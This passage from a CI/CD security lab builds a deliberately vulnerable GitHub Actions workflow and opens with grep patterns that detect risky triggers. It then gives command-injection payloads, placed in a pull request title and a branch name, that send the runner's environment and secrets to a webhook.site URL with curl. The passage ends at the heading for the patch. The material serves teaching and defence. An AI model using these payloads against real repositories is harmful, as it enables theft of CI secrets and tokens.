      }
    }
  }'

# Grep pipelines for known-bad patterns
grep -rE 'pull_request_target|workflow_run|issue_comment' .
grep -rE 'runs-on:\s*self-hosted' .
grep -rE 'permissions:\s*write-all' .
18. Hands-On — Vulnerable Workflow, Exploit, Patch

This lab requires two GitHub accounts (or a personal account plus a second identity you control) and a repository under your primary account. Do not target repositories you do not own.
18.1 Set Up the Vulnerable Repository
mkdir vuln-cicd-lab && cd vuln-cicd-lab
git init
mkdir -p .github/workflows

Create .github/workflows/vuln.yml:
name: PR Greeter (Vulnerable)
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read
  pull-requests: write
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Debug info
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          FAKE_DEPLOY_KEY: ${{ secrets.FAKE_DEPLOY_KEY }}
        run: |
          echo "New PR: ${{ github.event.pull_request.title }}"
          echo "From branch: ${{ github.event.pull_request.head.ref }}"
          echo "By: ${{ github.event.pull_request.user.login }}"

Add a repository secret FAKE_DEPLOY_KEY with a value like lab-canary-abc123 (never a real secret).
git add .
git commit -m "initial vulnerable workflow"
git branch -M main
git remote add origin https://github.com/<you>/vuln-cicd-lab.git
git push -u origin main
18.2 Exploit from a Fork

From your second identity, fork the repository. In the fork, open a PR to the parent. Set the PR title to:
Fix"; env | base64 -w0 | (curl -X POST --data-binary @- https://webhook.site/<your-uuid> || true); echo "

Use a webhook.site URL you control. When the workflow runs, the base64-encoded environment — including FAKE_DEPLOY_KEY — is exfiltrated to your webhook. Confirm the value arrives, then close the PR.
18.3 Alternative Payload via head.ref

Branch names are also expression inputs. From the fork, create a branch named:
foo$(curl -sfL https://webhook.site/<your-uuid>?h=$(hostname))

Push and open a PR. Same result via a different context field.
18.4 Patch

Replace .github/workflows/vuln.yml:
